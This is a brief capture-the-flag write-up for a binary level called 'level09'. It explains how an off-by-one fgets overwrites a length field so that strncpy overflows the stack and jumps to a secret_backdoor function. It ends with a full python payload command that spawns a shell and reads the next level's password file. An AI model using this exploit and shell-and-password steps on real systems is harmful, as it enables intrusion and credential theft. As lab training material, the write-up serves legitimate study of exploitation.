decompile ./level09

the program reads 41 bytes ( <= 40) in a buffer of 40 
This allow us to change the len variable in the struct msg
which allow us to overflow the stack of the handle_msg thanks to the strncpy

the first fgets should have 40 chars + 1 byte
this byte will have the value that we  want to the strncpy to write:
sizeof(struct) = 192 + 8(ebp) +8 (adress that we want in the return adress) = 208
									    = 0xd0

so first fgets = 40 bytes of padding + "\xd0"

second fgets = 200 bytes of padding + adress of secret_bacdoor()
the adress doesnt change because despite PIE is set the ASLR on the VM is disable:
cat /proc/sys/kernel/randomize_va_space 
0

final command :
(python -c 'print "a" * 40 + "\xd0"'; python -c 'import struct; print "a" * 200 + struct.pack("<Q", 0x55555555488c)')
/bin/sh
cat /home/users/end/.pass
